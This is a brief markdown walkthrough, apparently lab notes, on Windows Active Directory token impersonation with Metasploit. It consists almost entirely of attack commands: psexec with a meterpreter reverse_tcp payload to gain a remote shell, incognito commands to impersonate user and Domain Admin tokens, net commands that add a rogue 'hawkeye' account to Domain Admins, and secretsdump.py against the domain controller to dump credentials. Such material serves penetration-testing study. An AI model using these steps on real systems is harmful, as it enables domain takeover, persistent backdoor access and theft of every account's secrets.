## Token Impersonation Walkthrough

### Domain User Impersonation
- Load metasploit
- `use exploit/windows/smb/psexec`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set rhost <user machine IP>`
- `set smbuser <username>`
- `set smbpass <password>`
- `set smbdomain <domain>`
- `run`
- Should get a meterpreter shell now
- `load incognito`
- `list_tokens -u`

  ![image](https://github.com/user-attachments/assets/bc2decab-98b2-4e1e-9c0c-81b49b3bcbc7)

- `impersonate_token <domain>\\<username>`

  ![image](https://github.com/user-attachments/assets/c04e5b9c-ddd5-439c-9ea6-7b779c69a717)

### Domain Admin Impersonation
- Logon as Domain Admin to workstation
- `list_tokens -u`

  ![image](https://github.com/user-attachments/assets/ecc73ff8-249a-43c8-be56-8766912b4bc0)

- `impersonate_token <domain>\\Administrator`

  ![image](https://github.com/user-attachments/assets/f3628b8c-1cf9-4515-952d-a4207a1201dd)

### Create a New Domain Admin
- `shell`
- `net user /add hawkeye Password1@ /domain`

  ![image](https://github.com/user-attachments/assets/b4b4bc9e-ef2e-4eed-9354-a64140d9c540)

- `net group "Domain Admins" hawkeye /ADD /DOMAIN`

  ![image](https://github.com/user-attachments/assets/4e97ca09-61b3-4fba-aebd-e6d88630a8d9)

### PoC
- Dump secrets: `secretsdump.py <domain>/hawkeye:'Password1@'@<DC IP>`

  ![image](https://github.com/user-attachments/assets/cee67092-e6d1-43c4-b8cd-27d5cfd90152)

- WOAH


![image](https://github.com/user-attachments/assets/20658b02-84e0-4bad-8cf7-c94435c88bc1)

